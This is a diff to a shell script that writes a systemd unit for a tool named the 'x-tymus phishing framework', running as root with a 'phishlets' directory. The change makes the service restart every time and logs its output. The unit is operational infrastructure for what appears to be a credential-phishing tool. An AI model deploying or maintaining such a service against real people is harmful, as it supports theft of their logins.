@@ -13,20 +13,22 @@ cat > "$SERVICE_FILE" << 'EOF'
 [Unit]
 Description=x-tymus phishing framework
 After=network.target
+StartLimitIntervalSec=60
+StartLimitBurst=5
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=/root/project-x
-ExecStartPre=/bin/sh -c 'pkill -x x-tymus || true'
-ExecStartPre=/bin/sleep 2
 ExecStart=/root/project-x/build/x-tymus -p /root/project-x/phishlets -c /root/.x-tymus
+Restart=always
+RestartSec=5s
 KillMode=control-group
 KillSignal=SIGTERM
 TimeoutStopSec=15
-Restart=on-failure
-RestartSec=10s
 LimitNOFILE=65536
+StandardOutput=append:/var/log/x-tymus.log
+StandardError=append:/var/log/x-tymus.log
 
 [Install]
 WantedBy=multi-user.target
